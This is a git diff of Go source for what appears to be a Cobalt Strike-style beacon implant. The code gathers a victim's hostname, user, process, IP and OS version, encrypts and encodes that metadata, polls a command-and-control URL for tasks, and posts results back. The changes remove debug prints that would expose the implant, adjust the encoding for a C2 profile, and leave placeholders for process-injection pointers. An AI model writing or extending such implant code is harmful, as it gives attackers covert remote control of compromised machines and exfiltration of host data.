@@ -46,10 +46,6 @@ func DecryptPacket(b []byte) []byte {
 	return decrypted
 }
 
-func EncryptPacket() {
-
-}
-
 func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
 	commandTypeBytes := make([]byte, 4)
 	_, err := buf.Read(commandTypeBytes)
@@ -69,6 +65,10 @@ func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
 		panic(err)
 	}
 	*totalLen = *totalLen - (4 + 4 + commandLen)
+
+	//For printing out command type from CS
+	//fmt.Printf("Command type: %d", commandType)
+
 	return commandType, commandBuf
 
 }
@@ -121,9 +121,8 @@ func EncryptedMetaInfo() string {
 		panic(err)
 	}
 
-	//TODO c2profile encode method
-	finalPakcet := base64.StdEncoding.EncodeToString(packetEncrypted)
-	return finalPakcet
+	finalPacket := base64.RawURLEncoding.EncodeToString(packetEncrypted)
+	return finalPacket
 }
 
 /*
@@ -165,7 +164,6 @@ func MakeMetaInfo() []byte {
 		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
 	}
 
-	//for Smart Inject, will not be implemented
 	ptrFuncAddr := 0
 	ptrGMHFuncAddr := 0
 	ptrGPAFuncAddr := 0
@@ -204,7 +202,6 @@ func MakeMetaInfo() []byte {
 	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
 	osInfoBytes := []byte(osInfo)
 
-	fmt.Printf("clientID: %d\n", clientID)
 	onlineInfoBytes := utilities.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
 		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)
 
@@ -221,36 +218,22 @@ func InitialCallback() bool {
 	for {
 		resp := HttpGet(constants.GetUrl, encryptedMetaInfo)
 		if resp != nil {
-			fmt.Printf("firstblood: %v\n", resp)
 			break
 		}
 		time.Sleep(500 * time.Millisecond)
 	}
-	time.Sleep(constants.WaitTime)
+	time.Sleep(constants.SleepTime)
 	return true
 }
 
 func PullCommand() *req.Resp {
 	resp := HttpGet(constants.GetUrl, encryptedMetaInfo)
-	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
 	return resp
 }
 
 func PushResult(b []byte) *req.Resp {
-	url := constants.PostUrl + strconv.Itoa(clientID)
-	resp := HttpPost(url, b)
-	fmt.Printf("pushresult: %v\n", resp.Request().URL)
+	url := constants.PostUrl
+	id := strconv.Itoa(clientID)
+	resp := HttpPost(url, id, b)
 	return resp
 }
-
-/*
-func processError(err string) {
-	errIdBytes := WriteInt(0) // must be zero
-	arg1Bytes := WriteInt(0)  // for debug
-	arg2Bytes := WriteInt(0)
-	errMsgBytes := []byte(err)
-	result := utilities.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-	finalPaket := MakePacket(31, result)
-	PushResult(finalPaket)
-}
-*/
